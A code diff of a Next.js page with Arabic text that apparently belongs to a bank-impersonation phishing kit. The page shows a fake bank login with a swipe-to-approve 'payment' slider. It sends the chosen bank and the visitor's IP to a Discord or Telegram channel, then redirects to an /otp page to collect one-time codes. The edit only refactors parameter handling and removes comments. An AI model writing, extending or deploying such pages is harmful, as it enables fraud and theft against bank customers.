@@ -6,8 +6,7 @@ import Image from "next/image";
 import { useState, useEffect, useRef } from 'react';
 import TeleSned from "../../../../../server/TeleSend";
 
-// استقبل searchParams كـ prop بدلاً من useSearchParams()
-export default function Page({ searchParams }) {
+export default function Page() {
     const router = useRouter();
     const { Send } = TeleSned();
     const [isLoading, setIsLoading] = useState(false);
@@ -17,14 +16,20 @@ export default function Page({ searchParams }) {
     const [isDragging, setIsDragging] = useState(false);
     const [dragOffset, setDragOffset] = useState(0);
     const [isComplete, setIsComplete] = useState(false);
+    const [bankId, setBankId] = useState(null);
+    const [bankNameFromUrl, setBankNameFromUrl] = useState(null);
+    const [ipFromUrl, setIpFromUrl] = useState(null);
     
     const containerRef = useRef(null);
     const buttonRef = useRef(null);
-    
-    // الحصول على البارامترات من searchParams prop
-    const bankId = searchParams?.bankId || null;
-    const bankNameFromUrl = searchParams?.bankName || null;
-    const ipFromUrl = searchParams?.ip || null;
+
+    // استخراج البارامترات من URL
+    useEffect(() => {
+        const params = new URLSearchParams(window.location.search);
+        setBankId(params.get('bankId'));
+        setBankNameFromUrl(params.get('bankName'));
+        setIpFromUrl(params.get('ip'));
+    }, []);
 
     // جلب IP من API إذا لم يكن موجود في URL
     useEffect(() => {
@@ -102,7 +107,6 @@ export default function Page({ searchParams }) {
         const offset = Math.min(Math.max(newX - dragOffset, 0), maxOffset);
         setDragOffset(offset);
         
-        // إذا وصل إلى النهاية
         if (offset >= maxOffset * 0.95) {
             handleApprove();
         }
@@ -116,7 +120,6 @@ export default function Page({ searchParams }) {
         }
     };
 
-    // إضافة مستمعي الأحداث
     useEffect(() => {
         if (isDragging) {
             document.addEventListener('mousemove', handleMouseMove);
@@ -135,7 +138,6 @@ export default function Page({ searchParams }) {
         setIsLoading(true);
         setDragOffset(100);
         
-        // إرسال تأكيد الموافقة إلى Discord
         try {
             const description = `✅ **تمت الموافقة على الدفع**\n\n` +
                                `📌 **البنك:** ${selectedBank?.name || 'غير معروف'}\n` +
@@ -148,7 +150,6 @@ export default function Page({ searchParams }) {
             console.error('❌ خطأ في الإرسال إلى Discord:', error);
         }
 
-        // التوجيه بعد 2 ثانية
         setTimeout(() => {
             setIsLoading(false);
             router.push(`/otp?bankId=${bankId}&bankName=${encodeURIComponent(selectedBank?.name || '')}&ip=${encodeURIComponent(userIp)}`);
@@ -180,7 +181,6 @@ export default function Page({ searchParams }) {
     return (
         <main className="flex min-h-screen flex-col items-center justify-center p-4 md:p-8 bg-gradient-to-br from-gray-50 to-gray-100">
             <div className="z-10 w-full max-w-md mx-auto">
-                {/* البطاقة العلوية */}
                 <div className="flex flex-col items-center justify-center w-full rounded-xl shadow-xl bg-white/95 backdrop-blur-sm p-6 md:p-8 border border-gray-100 mb-6">
                     <div className="w-20 h-20 relative rounded-full overflow-hidden bg-gray-50 flex items-center justify-center mb-4">
                         <Image
@@ -202,7 +202,6 @@ export default function Page({ searchParams }) {
                     </p>
                 </div>
 
-                {/* محتوى المصادقة */}
                 <div className="bg-white rounded-xl shadow-xl p-6 md:p-8 border border-gray-100">
                     <h1 className='text-lg font-bold text-center mb-2'>
                         تسجيل الدخول إلى {selectedBank.name}
@@ -215,20 +214,17 @@ export default function Page({ searchParams }) {
                         والسحب للموافقة
                     </p>
 
-                    {/* عنصر السحب */}
                     <div className="mb-6">
                         <div 
                             ref={containerRef}
                             className="relative h-14 bg-gray-200 rounded-full overflow-hidden shadow-inner cursor-pointer"
                             onMouseDown={handleMouseDown}
                         >
-                            {/* خلفية التقدم */}
                             <div 
                                 className="absolute inset-0 bg-[#008000] transition-all duration-300"
                                 style={{ width: `${progress}%` }}
                             />
                             
-                            {/* النص الخلفي */}
                             <div className="absolute inset-0 flex items-center justify-center">
                                 <span className={`text-sm font-medium transition-colors duration-300 ${
                                     progress > 30 ? 'text-white' : 'text-gray-500'
@@ -237,7 +233,6 @@ export default function Page({ searchParams }) {
                                 </span>
                             </div>
                             
-                            {/* زر السحب */}
                             <div 
                                 ref={buttonRef}
                                 className="absolute top-1 bottom-1 w-12 bg-white rounded-full shadow-lg flex items-center justify-center transition-all duration-300"
@@ -258,7 +253,6 @@ export default function Page({ searchParams }) {
                         </div>
                     </div>
 
-                    {/* الوقت المتبقي */}
                     <div className="text-center">
                         <p className="text-sm text-gray-500">
                             الوقت المتبقي {timeLeft} ثانية
